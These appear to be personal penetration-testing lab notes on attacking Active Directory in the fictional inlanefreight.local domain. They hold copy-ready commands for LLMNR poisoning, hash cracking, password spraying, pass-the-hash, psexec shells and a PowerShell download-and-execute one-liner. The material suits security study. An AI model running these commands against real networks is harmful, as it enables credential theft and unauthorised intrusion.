-----------------

### Active Directory Enum

-----------------

- External recon-: Gathering data on your target
  - ASN/IP registrars: [iana](https://iana.org),[arin](https://arin.net) for Americas,[ripe](https://www.ripe.net/) for Europe and [BGP toolkit](https://bgp.he.net/)
  - Domain Registrars-: [Domain tools](https://www.domaintools.com/),[PTR Archive](http://ptrarchive.com/) and [ICANN](https://lookup.icann.org/lookup)
  - Social Media-: Linkedin, Facebook, Twitter and News Article
  - Cloud and Dev storage places-: Github dorks, [Grayhatwarfare](https://grayhatwarfare.com/) and Google dorks
  - Breach Data Sources-: [HaveIbeenPwned](https://haveibeenpwned.com/) for breaches and [Dehashed](https://www.dehashed.com/) for corporate mails and passwords.

-------------------

### Initial Enumeration

-------------------

- Gathering hosts
- Wireshark can be used to gather hosts with the syntax below-:

```bash
sudo wireshark -E enss224 -A
```
- Tcpdump-:
```bash
sudo tcpdump -i ens224 
```

- Gather host with `fping`,Fping provides us with a similar capability as the standard ping application in that it utilizes ICMP requests and replies to reach out and interact with a host. 

```bash
fping -asgq 172.16.5.0/23
```

![image](https://github.com/user-attachments/assets/262fbd26-4d41-4f6a-9f40-ea6150894d0f)

- Nmap-:

```bash
sudo nmap -A -iL hosts.txt -oN result2
```

------------------

### Username Enumeration[Internal AD Username enum with Kerbrute]

------------------

- [Wordlist](https://github.com/insidetrust/statistically-likely-usernames) Use `jsmith.txt` and `jsmith2.txt` to brute force it
- Installing `kerbrute` [precompiled releases](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3)

![image](https://github.com/user-attachments/assets/f1a525bf-74e3-4069-8177-1b327405adec)

- Syntax-:

```bash
kerbrute userenum -d <DOMAIN> --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

![image](https://github.com/user-attachments/assets/7976b616-25f6-4e37-91f6-a71c93d395fb)


----------------

### LLMNR/NBT-NS Poisoning

----------------

- After internal enumeration of the hosts and services, In this phase, we will work through two different techniques side-by-side: network poisoning and password spraying. We will perform these actions with the goal of acquiring valid cleartext credentials for a domain user account, thereby granting us a foothold in the domain to begin the next phase of enumeration from a credentialed standpoint.
- LLMNR-: port 5355
- NBT-NS: 137
- A Man-in-the-Middle attack on Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) broadcasts. Depending on the network, this attack may provide low-privileged or administrative level password hashes that can be cracked offline or even cleartext credentials. Though not covered in this module, these hashes can also sometimes be used to perform an SMB Relay attack to authenticate to a host or multiple hosts in the domain with administrative privileges without having to crack the password hash offline. Let's dive in!Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails
- LLMNR/NBT-NS can be used for name resolution and this is where responder comes in.We can spoof an authoritative name resolution source ( in this case, a host that's supposed to belong in the network segment ) in the broadcast domain by responding to LLMNR and NBT-NS traffic as if they have an answer for the requesting host.his poisoning effort is done to get the victims to communicate with our system by pretending that our rogue system knows the location of the requested host. If the requested host requires name resolution or authentication actions, we can capture the NetNTLM hash and subject it to an offline brute force attack in an attempt to retrieve the cleartext password. The captured authentication request can also be relayed to access another host or used against a different protocol (such as LDAP) on the same host.
- Quick Explanation-:
  - A host attempts to connect to the print server at \\print01.inlanefreight.local, but accidentally types in \\printer01.inlanefreight.local.
  - The DNS server responds, stating that this host is unknown.
  - The host then broadcasts out to the entire local network asking if anyone knows the location of \\printer01.inlanefreight.local.
  - The attacker (us with Responder running) responds to the host stating that it is the \\printer01.inlanefreight.local that the host is looking for.
  - The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.

- Responder-:
```bash
sudo responder -I ens224 
```
![image](https://github.com/user-attachments/assets/30273a69-842a-4b87-bb89-aca45e1d1aef)

- Cracking NTLMv2 hash with hashcat-:

```bash
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```
- Use John the Ripper-:

```bash
john --wordlist=[] hash.txt
```

![image](https://github.com/user-attachments/assets/a0c99524-85aa-45d9-958c-c0e4610a4d03)

![image](https://github.com/user-attachments/assets/caa7ddbe-8696-4547-8d1e-6be5c31ff80a)

- Responder logs are stored in `/usr/share/responder/logs`-:

![image](https://github.com/user-attachments/assets/e0045ce3-c707-44b1-90c0-156ca1e9b165)

--------------

### Exploitng LLMNR/NBT-NS attacks with Inveigh.exe on windows

-------------

- [Inveigh](https://github.com/Kevin-Robertson/Inveigh)-: If we end up with a Windows host as our attack box, our client provides us with a Windows box to test from, or we land on a Windows host as a local admin via another attack method and would like to look to further our access, the tool Inveigh works similar to Responder, but is written in PowerShell and C#. Inveigh can listen to IPv4 and IPv6 and several other protocols, including LLMNR, DNS, mDNS, NBNS, DHCPv6, ICMPv6, HTTP, HTTPS, SMB, LDAP, WebDAV, and Proxy Auth.
- Let's start Inveigh with LLMNR and NBNS spoofing, and output to the console and write to a file.Don't forget to run as adminstrator `powershell start powershell -v runAs`.Using Inveigh-:

```powershell
Invoke-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
![image](https://github.com/user-attachments/assets/56b17304-f7db-49e0-93a7-ba3c29d4996e)
- Captured Hashes-:

![image](https://github.com/user-attachments/assets/211c8faf-8c75-4c48-8d5c-1b475598d6e1)


- C# Inveigh Zero-:
- Usage-:
```powershell
.\Inveigh.exe
```
- We can hit the esc key to enter the console while Inveigh is running.

![image](https://github.com/user-attachments/assets/5274c331-3afc-4f79-a58a-26e952918efa)

- Hit "help" for several options-:

![image](https://github.com/user-attachments/assets/c119c284-9260-4473-a2a7-ee28272352a8)

- We can quickly view unique captured hashes by typing `GET NTLMV2UNIQUE`.

![image](https://github.com/user-attachments/assets/52644780-7bab-4de7-8936-bad04d34d94b)![image](https://github.com/user-attachments/assets/3d593408-ec58-423d-a39f-1fd1063b8261)

- We can type in `GET NTLMV2USERNAMES` and see which usernames we have collected.

---------------

### Using ldap-search

----------------

- To filter objects, use -W "objectClass="

```bash
ldapsearch -x -H ldap://[ip] -b 'dc=support,dc=htb' -D "support\ldap" -W 'objectClass=user'
```

- All objects, use -W "objectClass=*"

![image](https://github.com/user-attachments/assets/4ad995ae-a820-4520-a17d-8c5c68fe8abe)

- Users in the directory -: `objectClass=user`

```bash
ldapsearch -x -H ldap://[ip] -b 'dc=support,dc=htb' -D "support\ldap" -W 'objectClass=user'
```

- Using ldapsearch with password stored in a file.I used `-n` to prevent newline in text file.Use `-y` to specify passwd file.

```bash
ldapsearch -x -H ldap://support.htb -b 'dc=support,dc=htb' -D "support\ldap" -W 'objectClass=user' -y passwd
```

```
echo -n "password" > passwd
chmod 600 passwd
```

![image](https://github.com/user-attachments/assets/966f7ace-f31a-49d7-bbdc-b9f715219953)

- Finding the user without -W "filter" -:

```bash
ldapsearch -x -H ldap://support.htb -b 'cn=support,cn=users,dc=support,dc=htb' -D "support\ldap" '(objectClass=user)' -y passwd
```
![image](https://github.com/user-attachments/assets/9472fa1e-9422-4dde-b5fe-ba2d4e2d46f0)

- Groups-:

```bash
ldapsearch -x -H ldap://support.htb -b 'dc=support,dc=htb' -D "support\ldap" '(objectClass=group)'
```

- Computer Accounts-:

```bash
ldapsearch -x -H ldap://support.htb -b 'dc=support,dc=htb' -D "support\ldap" '(objectClass=computer)' -y passwd
```

- Users of a group-:

```bash
ldapsearch -x -H ldap://support.htb -b 'dc=support,dc=htb' -D "support\ldap" '(sAMAccountName=*)' -y passwd
```

--------------

### Using Bloodhound-ce

---------------

- [Installation](https://github.com/dirkjanm/BloodHound.py)-:

```bash
pip install bloodhound-ce #community edition
pip install bloodhound #legaacy version
#same syntax tho
```
- Usage`[-c -> 'all']`-:

```
bloodhound-ce-python -u [user@domain] -p '[password]' -ns [nameserver / IP] -d [domain] -c [collection method]
```

![image](https://github.com/user-attachments/assets/902b2934-ae9d-4012-8876-e255d3a38626)

- Collector for [Bloodhound 4.3.1](https://github.com/SpecterOps/BloodHound-Legacy/blob/master/Collectors/SharpHound.exe)

![image](https://github.com/user-attachments/assets/b78f5f72-6f3a-4e63-9d1b-23630909ff07)

---------------

### Password Spraying overview

---------------

- Enumerating and retrieving password policies
 - With valid domain credentials, the password policy can also be obtained remotely using tools such as CrackMapExec, rpcclient or nxc.
   ```bash
   nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --pass-pol
   ```
   <img width="1908" height="500" alt="image" src="https://github.com/user-attachments/assets/e970ee24-cf00-4975-8915-f90bbe6512ac" />

- You can also use smb null sessions.The first is via an SMB NULL session. SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. SMB NULL session misconfigurations are often the result of legacy Domain Controllers being upgraded in place, ultimately bringing along insecure configurations, which existed by default in older versions of Windows Server.
- Using `rpcclient`-:

```bash
rpcclient -U "" -N 172.16.5.5
```

- Query for passwordinfo with `querydominfo` and `getdompwinfo`.

<img width="629" height="427" alt="image" src="https://github.com/user-attachments/assets/2ec677b6-02a3-4daa-af12-fa290f5e9fac" />

- Use `Enum4linux-ng`

```bash
enum4linux -P 172.16.5.5
```

<img width="1068" height="898" alt="image" src="https://github.com/user-attachments/assets/d39bc36f-cc5a-4b56-8959-4b44980756f4" />

- Or use `enum4linux-ng` to retrieve the output in a file format

```bash
enum4linux-ng -P 172.16.5.5 -oA ilfreight
```
- Enumerating the Password Policy - from Linux - LDAP Anonymous Bind
 - LDAP anonymous binds allow unauthenticated attackers to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. This is a legacy configuration, and as of Windows Server 2003, only authenticated users are permitted to initiate LDAP requests. We still see this configuration from time to time as an admin may have needed to set up a particular application to allow anonymous binds and given out more than the intended amount of access, thereby giving unauthenticated users access to all objects in AD.
   ```bash
   ldapsearch -H ldap://172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
   ```

<img width="1242" height="284" alt="image" src="https://github.com/user-attachments/assets/188505c9-5980-4c56-b270-76854ecb4395" />


--------------

### Windows 

--------------

- Using net for null sessions

```cmd
 net use \\host\ipc$ "" /u:"" 
```

- Use

```cmd
net accounts
```

- Powerview script

```powershell
import-module .\PowerView.ps1
Get-DomainPolicy
```

---------------

### Making a user list for password spraying

---------------

- Using enum4linux

```bash
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

<img width="1003" height="564" alt="image" src="https://github.com/user-attachments/assets/3284864b-5378-47e7-87c1-674902874bda" />

- Using rpcclient's `enumdomusers`

```bash
rpcclient -U "" -N 172.16.5.5
```

<img width="695" height="594" alt="image" src="https://github.com/user-attachments/assets/d559c55d-df34-4cf9-a191-fcd4324147af" />

- Using `nxc`'s `--users` flag

```bash
nxc smb[host] --users
```

<img width="1902" height="739" alt="image" src="https://github.com/user-attachments/assets/b7316540-d2c7-424c-b398-9ba6ab882823" />

- Or use `ldapsearch`,it should also be noted that the use of `-h` is deprecated while `-H` is the new switch.

```bash
ldapsearch -H ldap://172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

<img width="1618" height="486" alt="image" src="https://github.com/user-attachments/assets/201183f5-da5e-4b99-965e-e2e805bcca7d" />

- Or `winldapsearch`-:
```bash
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```
- Or use `kerbrute`

```bash
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```

- Lastly, you can enumerate users with credentials.Use nxc

```bash
nxc smb 172.16.5.5 -u htb-student -p "Academy_student_AD\!" --users
```

<img width="1913" height="589" alt="image" src="https://github.com/user-attachments/assets/cd4c36b7-462f-4ecd-a6fa-0d8fa2ef7e2e" />



---------------

### Password Spraying

----------------

-   Rpcclient is an excellent option for performing this attack from Linux. An important consideration is that a valid login is not immediately apparent with rpcclient, with the response Authority Name indicating a successful login. We can filter out invalid login attempts by grepping for Authority in the response. The following Bash one-liner (adapted from here) can be used to perform the attack.

```bash
for u in $(cat valid_ad_users);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

<img width="1420" height="684" alt="image" src="https://github.com/user-attachments/assets/c3a56b02-aeb7-4936-aecd-cb7e7320c4dd" />

- Kerbrute too-:

```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

<img width="1064" height="389" alt="image" src="https://github.com/user-attachments/assets/23b483a6-1fc3-429d-88f8-fcd774498b42" />

- Using nxc-:

```bash
nxc smb 172.16.5.5 -u [file_name] -p Password123 | grep +
```

- Validating with nxc-:

```bash
nxc smb 172.16.5.5 -u avazquez -p Password123
```

<img width="1897" height="571" alt="image" src="https://github.com/user-attachments/assets/2dbdef7c-593b-431f-bafb-cf45f1a2db9d" />

- When working with local administrator accounts, one consideration is password re-use or common password formats across accounts. If we find a desktop host with the local administrator account password set to something unique such as $desktop%@admin123, it might be worth attempting $server%@admin123 against servers. Also, if we find non-standard local administrator accounts such as bsmith, we may find that the password is reused for a similarly named domain user account. The same principle may apply to domain accounts. If we retrieve the password for a user named ajones, it is worth trying the same password on their admin account (if the user has one), for example, ajones_adm, to see if they are reusing their passwords. This is also common in domain trust situations. We may obtain valid credentials for a user in domain A that are valid for a user with the same or similar username in domain B or vice-versa.
- Password spraying hash gotten from a SAM database with `nxc`. The `--local-auth` flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout. Make sure this flag is set so we don't potentially lock out the built-in administrator for the domain.

```bash
nxc smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```


----------------

### With Windows

-----------------

-

-----------------

### Enumerating Security Controls

-----------------

- After gaining access, it is important to understand the defensive state of the host, enumerate further with tools or `living off the land` with tools that exist solely on the host.
- Windows Defender, use-: If real-time protection is set, it is  active

```powershell
Get-MpComputerStatus
```

- Applocker-: An application whitelist is a list of approved software applications or executables that are allowed to be present and run on a system. The goal is to protect the environment from harmful malware and unapproved software that does not align with the specific business needs of an organization.It is common for organizations to block cmd.exe and PowerShell.exe and write access to certain directories, but this can all be bypassed. Organizations also often focus on blocking the PowerShell.exe executable, but forget about the other PowerShell executable locations such as `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`. We can see that this is the case in the AppLocker rules shown below.
- Getting the rules-:

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

- Powershell Constrained Language Mode-: It restricts the syntax to be used on powershell

```powershell
$ExecutionContext.SessionState.LanguageMode
```

- LAPS(MIcrosoft Local Administrator Password Solution)-: It is used to randomize and rotate local administrator passwords on Windows hosts and prevent lateral movement. We can enumerate what domain users can read the LAPS password set for machines with LAPS installed and what machines do not have LAPS installed.  The LAPSToolkit greatly facilitates this with several functions. One is parsing ExtendedRights for all computers with LAPS enabled. This will show groups specifically delegated to read LAPS passwords, which are often users in protected groups. An account that has joined a computer to a domain receives All Extended Rights over that host, and this right gives the account the ability to read passwords. Enumeration may show a user account that can read the LAPS password on a host. This can help us target specific AD users who can read LAPS passwords.
- Using `Find-LAPSDelegatedGroups`-:(This can help us target specific AD users who can read LAPS passwords.)
- The `Find-AdmPwdExtendedRights` checks the rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights." Users with "All Extended Rights" can read LAPS passwords and may be less protected than users in delegated groups, so this is worth checking for.
- We can use the `Get-LAPSComputers` function to search for computers that have LAPS enabled when passwords expire, and even the randomized passwords in cleartext if our user has access.

-----------------

### Credentialed Enumeration (from Linux)

-----------------

- Using `nxc`(crackmapxec upgraded version)-:
- Domain User Enumeration-:

```bash
nxc smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

<img width="1876" height="454" alt="image" src="https://github.com/user-attachments/assets/3ec37e6e-36c2-435b-845c-5a20ba425bf6" />

- Domain group enumeration(use crackmapexec)-:

```bash
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```
<img width="1905" height="707" alt="image" src="https://github.com/user-attachments/assets/24eca022-436d-40da-b9cc-230863387582" />

- Logged-on-users too-:

```bash
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --loggedon-users
```
- Share enumeration-:

```bash
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --loggedon-users
```
<img width="1887" height="314" alt="image" src="https://github.com/user-attachments/assets/713e0cd4-37cb-421c-a751-2e0c253c9a1e" />

- Grab all shares-:

```bash
nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus
```

<img width="1908" height="622" alt="image" src="https://github.com/user-attachments/assets/937876fd-0f3d-472d-a48d-6d45a887df09" />

- Grab a single share-:

```bash
nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share "zzzz"
```
- Using smbmap-:
- Checking access-:

```bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```

<img width="1225" height="573" alt="image" src="https://github.com/user-attachments/assets/6bdab111-9849-4a8e-97b8-004f179a28cf" />

- Recursively listing all directories-:

```bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

<img width="1506" height="832" alt="image" src="https://github.com/user-attachments/assets/686375b3-e571-4ae4-a8dd-775b8ca9efdf" />

- RPCCLIENT-:rpcclient is a handy tool created for use with the Samba protocol and to provide extra functionality via MS-RPC. It can enumerate, add, change, and even remove objects from AD. It is highly versatile; we just have to find the correct command to issue for what we want to accomplish. The man page for rpcclient is very helpful for this; just type man rpcclient into your attack host's shell and review the options available. Let's cover a few rpcclient functions that can be helpful during a penetration test.

- Samba null session-:

```bash
rpcclient -U "" -N 172.16.5.5
```
<img width="419" height="113" alt="image" src="https://github.com/user-attachments/assets/66422a38-d3f1-4ac1-84e1-d44933a46691" />

-  What is an `RID`? A Relative Identifier (RID) is a unique identifier (represented in hexadecimal format) utilized by Windows to track and identify objects.Examples to full understand-:
  -   E.g the sid for domain `INLANEFREIGHT.local` is `S-1-5-21-3842939050-3880317879-2865463114`
  -   If an object is created on a domain the rid is merged with the sid to create a unique value of theobject
  -   So the domain user htb-student with a RID:[0x457] Hex 0x457 would = decimal 1111, will have a full user SID of: S-1-5-21-3842939050-3880317879-2865463114-1111.
- However, there are accounts that you will notice that have the same RID regardless of what host you are on. Accounts like the built-in Administrator for a domain will have a RID [administrator] rid:[0x1f4], which, when converted to a decimal value, equals 500. The built-in Administrator account will always have the RID value Hex 0x1f4, or 500. This will always be the case. Since this value is unique to an object, we can use it to enumerate further information about it from the domain. Let's give it a try again with rpcclient. We will dig a bit targeting the htb-student user.
- User enumeration by RID-:

```
queryuser 0x457
```

<img width="738" height="593" alt="image" src="https://github.com/user-attachments/assets/9ad13a92-2241-400c-94c7-2fa6b3e9771a" />

- Enumerating all users-:

```bash
enumdomusers
```

<img width="541" height="746" alt="image" src="https://github.com/user-attachments/assets/8b554b98-5d42-4906-ad2b-f020d968df7c" />

- Impacket-toolkit-:
- `Psexec.py`-:

```bash
impacket-psexec inlanefreight.local/wley:'transporter@4'@172.16.5.125  
```

- `wmiexec.py`-:

```bash
impacket-wmiexec inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

----------------

### Windapsearch

-----------------

- Windapsearch is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries.
- Checking for domain admins,[link](https://github.com/ropnop/go-windapsearch/releases/)-:

```bash
windapsearch -m domain-admins --dc 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```

<img width="1234" height="652" alt="image" src="https://github.com/user-attachments/assets/40f52905-ff5b-40d6-bc3b-5cbc3b4f897e" />

- Privileged users-:

```bash
windapsearch -m privileged-users  --dc 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```

<img width="1153" height="483" alt="image" src="https://github.com/user-attachments/assets/dd43d433-7525-4e37-b370-68c9c341a2b8" />

-----------------

### Bloodhound-python

-----------------

- Usage-:

```bash
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```

---------------

### Credentialed enumeration with windows

----------------

- [Active Directory powershell module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps)
- Investigating modules, search with

```powershell
Get-Module
```

<img width="745" height="274" alt="image" src="https://github.com/user-attachments/assets/52a523b7-7997-4338-bc19-ea682585784b" />

-  The Get-Module cmdlet, which is part of the Microsoft.PowerShell.Core module, will list all available modules, their version, and potential commands for use. This is a great way to see if anything like Git or custom administrator scripts are installed. If the module is not loaded, run Import-Module ActiveDirectory to load it for use.

```powershell
Import-Module ActiveDirectory
```

<img width="794" height="251" alt="image" src="https://github.com/user-attachments/assets/7c7c269a-4ef1-422c-859a-bb3cf5e4cddf" />

- Loaded

<img width="1010" height="215" alt="image" src="https://github.com/user-attachments/assets/2c941cdf-3f4e-4b5f-8fe5-2114f7d2fbe2" />

- Getting domain info-:

```powershell
Get-ADDomain
```

<img width="1004" height="639" alt="image" src="https://github.com/user-attachments/assets/7dd42999-33d2-49b6-8840-fc0b2c6b0e77" />

- `Get-ADUser` (We'll use the Get-ADUser cmdlet. We will be filtering for accounts with the ServicePrincipalName property populated. )

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

<img width="1011" height="452" alt="image" src="https://github.com/user-attachments/assets/9053efb7-812e-4b60-a2a0-6e707f71ea7c" />

- Trust relationships-:

```
Get-ADTrust -Filter *
```
<img width="1019" height="507" alt="image" src="https://github.com/user-attachments/assets/9f6a4c24-1dcc-4a37-b6fb-55bdef401d50" />

- Finding groups

```powershell
Get-ADGroup -Filter * | select name
```

<img width="1012" height="548" alt="image" src="https://github.com/user-attachments/assets/0236a68a-6f68-45f5-a315-278638ebb719" />

- Detailed group info-:

```powershell
Get-ADGroup -Identity "Backup Operators"
```
<img width="866" height="261" alt="image" src="https://github.com/user-attachments/assets/f646bf2b-e059-48af-acef-b0a229802801" />

- Getting a member listing of the group

```powershell
Get-ADGroupMember -Identity "Backup Operators"
```

<img width="907" height="402" alt="image" src="https://github.com/user-attachments/assets/ffcbe3bc-c2cf-4737-87f4-d54e6a031417" />


----------------

### Powerview

-----------------

- 

-----------------

### Blooodhound Cypher queries

-----------------

- [Haussec](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)

---------------

### Snaffler

----------------

- Snaffler is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment. Snaffler works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories. Once that is done, it iterates through any directories readable by our user and hunts for files that could serve to better our position within the assessment. Snaffler requires that it be run from a domain-joined host or in a domain-user context.
- [Snaffler](https://github.com/SnaffCon/Snaffler/releases)
- Using it-:

```powershell
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

<img width="993" height="440" alt="image" src="https://github.com/user-attachments/assets/044b0068-1de5-440e-81a1-3d7ce1be5991" />


----------------

### Living off the land

----------------

- Basic enumeration Commands
 - `hostname`-:`Prints the PC's name`
 - `[System.Environment]::OSVersion.Version`:`Prints out the OS version and revision level`

 <img width="559" height="155" alt="image" src="https://github.com/user-attachments/assets/b32cd515-7030-45d2-89e6-d0cf792b0896" />

 - `wmic qfe get Caption,Description,HotFixID,InstalledOn`:`prints the patches to the host`:`prints out patches to the host`
 - `ipconfig /all`:`Network information`
 - `set`: `environmental variables`
 -  `echo %USERDOMAIN%`:`prints user domain`
 -  `echo %logonserver%`

-----------------  

- Harnessing powershell-:
  - `Get-Module`:`Show modules`
  - `Get-ExecutionPolicy -List`:`prints the execution process for a host`
  - ` Set-ExecutionPolicy Bypass -Scope Process`:`Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.`
  - `Get-ChildItem Env: | ft key,value`:`Return environment values such as key paths, users, computer information, etc.`
  - `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`:`With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.`
  - `powershell -nop -c "iex(New-Object New-WebClient).DownloadString('url');Some Command"`:`This is a quick and easy way to download a file from the web using PowerShell and call it from memory.`

- Downgrading powershell

```powershell
Get-Host
powershell -version 2
```

<img width="1018" height="374" alt="image" src="https://github.com/user-attachments/assets/5f1f687e-d44f-4cb4-98f7-a0173ea5e0f5" />

- Checking Defenses-:

```powershell
netsh advfirewall show allprofiles
```
- `sc query windefend`::`checking if windefender is active`
- `Get-MpComputerStatus`:`Checking if AV is enabled`

- `qwinsta`::`checking if an individual is logged in to the host`
- Networking Commands
  - `arp -a`::`List all hosts in the arp table`
  - `ipconfig /all`::`Prints out adapter settings for the host. We can figure out the network segment from here.`
  - `route print`: `Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.`

-----------------

### Windows Management Instructions

------------------

- Windows Management Instrumentation (WMI) is a scripting engine that is widely used within Windows enterprise environments to retrieve information and run administrative tasks on local and remote hosts. For our usage, we will create a WMI report on domain users, groups, processes, and other information from our host and other domain hosts.

| Commands                                                |   Description                                                                          |
|-------------------------------------------------------- |-----------------------------------------------------------------------------------------|
| wmic qfe get Caption,Description,HotFixID,InstalledOn|Prints the patch level and description of the Hotfixes applied                           |
| wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List	| Displays basic host information to include any attributes within the list
wmic process list /format:list	| A listing of all processes on host
wmic ntdomain list /format:list	| Displays information about the Domain and Domain Controllers
wmic useraccount list /format:list	| Displays information about all local accounts and any domain accounts that have logged into the device
wmic group list /format:list	| Information about all local groups
wmic sysaccount list /format:list	| Dumps information about any system accounts that are being used as service accounts.

- [Cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4)

- Net commands-:

| Commands                        |      Description            |
|---------------------------------|-----------------------------|
net accounts	| Information about password requirements
net accounts /domain	|Password and lockout policy
net group /domain	|Information about domain groups
net group "Domain Admins" /domain	|List users with domain admin privileges
net group "domain computers" /domain	|List of PCs connected to the domain
net group "Domain Controllers" /domain	|List PC accounts of domains controllers
net group <domain_group_name> /domain	|User that belongs to the group
net groups /domain	|List of domain groups
net localgroup	|All available groups
net localgroup administrators /domain	|List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)
net localgroup Administrators	|Information about a group (admins)
net localgroup administrators [username] /add	| Add user to administrators
net share	Check current shares
net user <ACCOUNT_NAME> /domain	|Get information about a user within the domain
net user /domain	|List all users of the domain
net user %username%	|Information about the current user
net use x: \computer\share	|Mount the share locally
net view	|Get a list of computers
net view /all /domain[:domainname]	|Shares on the domains
net view \computer /ALL	|List shares of a computer
net view /domain	|List of PCs of the domain

- Dsquery-: Dsquery is a helpful command-line tool that can be utilized to find Active Directory objects. The queries we run with this tool can be easily replicated with tools like BloodHound and PowerView, but we may not always have those tools at our disposal, as discussed at the beginning of the section. But, it is a likely tool that domain sysadmins are utilizing in their environment. With that in mind, dsquery will exist on any host with the Active Directory Domain Services Role installed, and the dsquery DLL exists on all modern Windows systems by default now and can be found at C:\Windows\System32\dsquery.dll.
- User search

```cmd
dsquery user
```

- Computer search

```cmd
dsquery computer
```

- WIldcard search-:

```powershell
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```
- Finding users with the `PASSWD_NOTREQD` flag with dsquery

```powershell
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```
- Searching for doamin controllers

```pwsh
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

------------------

### LDAP FIltering

------------------

- You will notice in the queries above that we are using strings such as userAccountControl:1.2.840.113556.1.4.803:=8192. These strings are common LDAP queries that can be used with several different tools too, including AD PowerShell, ldapsearch, and many others. Let's break them down quickly:

- The identifier `userAccountControl:1.2.840.113556.1.4.803:` Specifies that we are looking at the User Account Control (UAC) attributes for an object. This portion can change to include three different values we will explain below when searching for information in AD (also known as Object Identifiers (OIDs).

- The `=8192` represents the decimal bitmask we want to match in this search. This decimal number corresponds to a corresponding UAC Attribute flag that determines if an attribute like password is not required or account is locked is set. These values can compound and make multiple different bit entries. Below is a quick list of potential values.

<img width="2576" height="1780" alt="image" src="https://github.com/user-attachments/assets/f742a6de-d177-4198-bd7d-8f9f1b89dd2c" />

- Logical Operators
- When building out search strings, we can utilize logical operators to combine values for the search. The operators & | and ! are used for this purpose. For example we can combine multiple search criteria with the & (and) operator like so:
`(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))`

------------------

### AN ACE IN THE HOLE

------------------

- Access Control List(ACL) Abuse primer
- For security reasons, not all users and computers are allowed to access files on a domain. That's where Access Control List comes in.Although, a simple misconfiguration may affect it.
- In their simplest form, ACLs are lists that define a) who has access to which asset/resource and b) the level of access they are provisioned. The settings themselves in an ACL are called Access Control Entries (ACEs). Each ACE maps back to a user, group, or process (also known as security principals) and defines the rights granted to that principal. Every object has an ACL, but can have multiple ACEs because multiple security principals can access objects in AD. ACLs can also be used for auditing access within AD.
- Types of ACL(Access Control List)-:
  - Discretional Access Control List-: defines which security principals are granted or denied access to an object. DACLs are made up of ACEs that either allow or deny access. When someone attempts to access an object, the system will check the DACL for the level of access that is permitted. If a DACL does not exist for an object, all who attempt to access the object are granted full rights. If a DACL exists, but does not have any ACE entries specifying specific security settings, the system will deny access to all users, groups, or processes attempting to access it.
  - System Access Control List-:  allow administrators to log access attempts made to secured objects.

-  



------------------
